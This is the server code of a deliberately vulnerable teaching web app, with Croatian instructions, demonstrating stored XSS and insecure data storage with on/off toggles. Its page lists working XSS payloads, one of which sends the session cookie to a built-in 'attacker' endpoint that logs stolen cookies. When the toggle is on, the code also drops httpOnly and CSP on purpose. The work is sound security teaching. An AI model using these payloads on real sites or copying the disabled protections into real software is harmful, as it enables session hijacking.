import express from "express";
import cookieParser from "cookie-parser";
import crypto from "crypto";
import { layout, toggle, escapeHtml, Settings } from "./views";
import { comments, stolen, renderComments } from "./xss";

const app = express();
const port = Number(process.env.PORT) || 3000;

app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

function readSettings(req: express.Request): Settings {
    return {
        xss: req.cookies.xss !== "0",
        sde: req.cookies.sde !== "0",
    };
}

app.use((req, res, next) => {
    const s = readSettings(req);
    const existing = req.cookies.sessionId;
    const sid = typeof existing === "string" && /^[a-f0-9]{32}$/.test(existing)
        ? existing
        : crypto.randomBytes(16).toString("hex");
    res.cookie("sessionId", sid, { httpOnly: !s.xss, sameSite: "lax" });
    if (!s.xss) {
        res.setHeader("Content-Security-Policy", "default-src 'self'");
    }
    next();
});

app.get("/", (req, res) => {
    const s = readSettings(req);
    res.send(layout(`
<hr>
<h2>Cross-site scripting (XSS) – pohranjeni</h2>
<p><b>Upute:</b> Komentar se sprema na poslužitelj i prikazuje svima.
Kad je ranjivost uključena, upisati jedan od komentara:</p>
<ul>
<li>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li>
<li>&lt;img src=x onerror="alert(document.cookie)"&gt;</li>
<li>&lt;script&gt;new Image().src='/steal?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</li>
</ul>
<p>Prva dva prikazuju cookie sjednice u alert prozoru, a treći ga šalje „napadaču” (link ispod).
Kad je ranjivost isključena, isti komentari prikazuju se kao običan tekst.</p>
${toggle("xss", s.xss)}
<form method="post" action="/xss/comment">
Komentar: <input name="text" size="60">
<button type="submit">Spremi komentar</button>
</form>
<form method="post" action="/xss/clear">
<button type="submit">Obriši sve komentare</button>
</form>
<p><a href="/napadac">Poslužitelj napadača – ukradeni cookies</a></p>
<h3>Komentari</h3>
${renderComments(s.xss)}
<hr>
<h2>Nesigurna pohrana osjetljivih podataka (Sensitive Data Exposure)</h2>
${toggle("sde", s.sde)}
`));
});

app.post("/settings/:name", (req, res) => {
    const name = req.params.name;
    if (name === "xss" || name === "sde") {
        const enabled = req.body?.enabled === "on";
        res.cookie(name, enabled ? "1" : "0", { sameSite: "lax", maxAge: 30 * 24 * 3600 * 1000 });
    }
    res.redirect("/");
});

app.post("/xss/comment", (req, res) => {
    const text = String(req.body?.text ?? "").trim().slice(0, 500);
    if (text) {
        comments.push(text);
    }
    res.redirect("/");
});

app.post("/xss/clear", (_req, res) => {
    comments.length = 0;
    res.redirect("/");
});

app.get("/steal", (req, res) => {
    stolen.push({ time: new Date().toISOString(), data: String(req.query.c ?? "") });
    res.status(204).end();
});

app.get("/napadac", (_req, res) => {
    const rows = stolen
        .map((s) => `<li>${s.time}: <code>${escapeHtml(s.data)}</code></li>`)
        .join("\n");
    res.send(layout(`
<h2>Poslužitelj napadača</h2>
<p>Cookies koje je napadačeva skripta poslala:</p>
${stolen.length ? `<ul>\n${rows}\n</ul>` : "<p>Još ništa nije ukradeno.</p>"}
<p><a href="/">Natrag</a></p>
`));
});

app.listen(port, () => {
    console.log(`Server: http://localhost:${port}`);
});